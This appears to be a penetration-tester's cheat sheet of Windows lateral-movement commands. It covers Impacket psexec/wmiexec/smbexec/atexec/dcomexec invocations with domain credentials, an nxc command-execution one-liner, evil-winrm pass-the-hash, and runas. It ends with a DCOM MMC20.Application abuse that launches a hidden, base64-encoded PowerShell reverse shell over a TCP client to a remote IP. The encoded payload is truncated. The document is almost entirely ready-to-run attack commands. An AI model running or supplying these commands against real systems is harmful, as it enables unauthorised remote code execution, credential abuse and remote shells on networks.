# Impacket script

PsExec (SMB) : upload executable using SMB + create a service to run the executable + Communicate with the service with namedPipe

```
psexec.py DOMAIN/USER:PASSWORD@TARGET
```

WmiExec (DCERPC + SMB) : Create new process throught wmi + Create file to get the command result, read the file with smb and delete it + 

```
wmiexec.py DOMAIN/USER:PASSWORD@TARGET
```

SmbExec (SMB) : Donâ€™t upload executable + Create a service on every request + Get the command results on a share or on a server controled by the attacker (with -mode SERVER)

```
smbexec.py DOMAIN/USER:PASSWORD@TARGET
```

AtExec (SMB) : use a schedule task to run the command

```
atexec.py DOMAIN/USER:PASSWORD@TARGET
```

DcomExec (DCERPC + SMB) : DecomExec (Distributed Component Object Model) + pseudo shell (get the result in files retreived with smb)

```
dcomexec.py DOMAIN/USER:PASSWORD@TARGET
```

Using nxc (by default impacket's wmiexec method is used) 

```
cme smb 10.0.0.0 -p [password] -u [user] -x [command] (--exec-method {smbexec,mmcexec,wmiexec,atexec})
```

# WinRM
Execution though HTTP/HTTPS
```
evil-winrm -i [IP] -u [user] -H [Hash]
```

# RDP
The RDP service could be used to execute commands


# DCOM windows

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
# Powershell

`runas /user:testuser@dom.local /netonly powershell.exe`
